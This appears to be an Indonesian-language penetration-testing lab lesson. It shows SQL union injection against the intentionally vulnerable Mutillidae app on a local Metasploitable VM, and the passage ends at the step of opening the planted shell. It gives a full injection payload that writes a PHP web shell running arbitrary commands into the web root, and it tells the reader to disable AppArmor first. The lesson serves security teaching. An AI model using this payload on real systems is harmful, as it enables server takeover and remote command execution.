## Lesson 10 - SQL Injection Union Exploit \#3

### \# Inject Backdoor di halaman User Info

* **Step 1** : Buka `http://10.151.36.64/mutillidae/` lalu masuk ke halaman user info. Pilih sidebar. OWASP Top 10 --&gt; A1 - SQL Injection --&gt; SQLi - Extract Data --&gt; User Info
  ![](/assets/lesson-7/VirtualBox_kali_19_12_2017_03_01_34.png)

* **Step 2** : Ubah ukuran text box username menjadi 100% menggunakan inspect element agar text box lebih panjang untuk menuliskan syntax SQL Injection.  
  ![](/assets/lesson-8/VirtualBox_kali_19_12_2017_20_37_43.png)

* **Step 3** : Matikan AppArmor pada Metasploitable OS dengan `sudo /etc/init.d/apparmor stop`
AppArmor dalam OS turunan Ubuntu berfungsi untuk membatasi resource dari aktivitas-aktivitas sistem. Hal ini agar MySQL memiliki akses read/write di directori web app.

* **Step 4** : Membuat Backdoor dengan SQL Union Injection dengan memasukan operasi sql di bawah di dalam textbox **Name** lalu tekan tombol _View Account Details_
```
' union select null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><input type="text" name="CMD" size="50"><input type="submit" value="Execute Command" /></form><?php echo "<pre>";echo shell_exec($_REQUEST["CMD"]);echo "</pre>"; ?>' INTO DUMPFILE '/var/www/mutillidae/execute_command.php' -- 
```
Dan jangan lupa untuk menambahkan 1 spasi diakhir, `"-- "`. Operasi ini adalah tidak akan menampilkan hasil, justru Authentication Error. Namun disisi lain akan membuat file **execute_command.php**

* **Step 5** : Melihat hasil operasi dengan command berikut pada OS Metasploitable `cat /var/www/mutillidae/execute_command.php` 

### \# Menggunakan Backdoor untuk pengamatan

* **Step 1** : Buka halaman php yang sudah kita buat `http://10.151.36.64/mutillidae/execute_command.php`



